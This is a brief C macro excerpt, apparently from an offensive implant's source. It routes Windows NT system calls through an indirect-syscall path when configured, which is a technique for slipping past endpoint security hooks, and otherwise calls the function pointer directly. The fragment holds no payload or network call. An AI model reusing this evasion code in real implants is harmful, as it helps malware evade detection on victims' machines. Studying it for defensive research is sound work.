...
#define SYSCALL_INVOKE( SYS_NAME, ... )                                                                      \
    if ( ((INSTANCE *)Instance)->Config.Implant.SysIndirect && ((INSTANCE *)Instance)->Syscall.SysAddress && ((INSTANCE *)Instance)->Syscall.SYS_NAME ) { \
        SysConfig.Ssn = ((INSTANCE *)Instance)->Syscall.SYS_NAME;                                                           \
        SysConfig.Adr = ((INSTANCE *)Instance)->Syscall.SysAddress;                                                         \
        SysSetConfig( &SysConfig );                                                                          \
        NtStatus = SysInvoke( __VA_ARGS__ );                                                                 \
    } else {                                                                                                 \
        NtStatus = ((INSTANCE *)Instance)->Win32.SYS_NAME( __VA_ARGS__ );                                                   \
    }                                                                                                        \
    PRINTF( "%s( ... ) = %08x\n", #SYS_NAME, NtStatus )
